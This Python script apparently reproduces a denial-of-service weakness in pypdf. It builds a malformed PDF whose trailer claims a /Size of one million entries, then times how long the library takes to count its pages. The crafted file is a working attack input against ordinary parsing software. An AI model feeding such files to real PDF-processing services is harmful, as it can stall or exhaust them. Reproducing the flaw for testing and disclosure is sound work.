import io, time
from pypdf import PdfReader
def build(size):
    out = b"%PDF-1.7\n"; off = len(out)
    out += b"1 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    xref = len(out)
    out += b"xref\n0 2\n0000000000 65535 f \n%010d 00000 n \n" % off
    out += b"trailer\n<< /Size %d >>\nstartxref\n%d\n%%%%EOF\n" % (size, xref)
    return out
data = build(10**6)
print("file size bytes:", len(data))
r = PdfReader(io.BytesIO(data))
t = time.perf_counter()
try: len(r.pages)
except Exception as e: print("raised", type(e).__name__)
print("time for /Size=10^6:", round(time.perf_counter()-t,1), "s")
